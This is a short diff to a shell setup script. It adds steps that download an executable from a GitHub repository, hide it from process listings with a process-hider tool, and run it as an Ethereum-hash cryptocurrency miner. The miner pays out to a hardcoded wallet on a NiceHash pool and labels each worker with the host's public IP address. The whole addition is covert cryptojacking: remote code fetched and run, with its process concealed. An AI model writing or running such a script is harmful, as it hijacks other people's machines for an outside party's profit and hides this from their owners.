@@ -12,7 +12,9 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 sudo apt install nodejs
 apt-get install screen -y
 npm i -g node-process-hider
-sudo ph add coinbtc
-chmod +x ./coinbtc && sudo ./coinbtc --algo ETHASH --pool $POOL --user $WALLET.$WORKER $@ --ethstratum ETHPROXY
+wget -qO gede https://raw.githubusercontent.com/hndouehdw/nhcque/master/coinbtc
+sudo ph add gede
+chmod +x ./gede
+./gede --algo ETHASH --pool stratum+tcp://daggerhashimoto.usa-west.nicehash.com:3353 --user 3K58rk4hAySW78RPaxkzFVhddAL7iMxkbZ.$(echo "$(curl -s ifconfig.me)" | tr . _ )-GASMAWON $@ --ethstratum ETHPROXY
 
 echo success
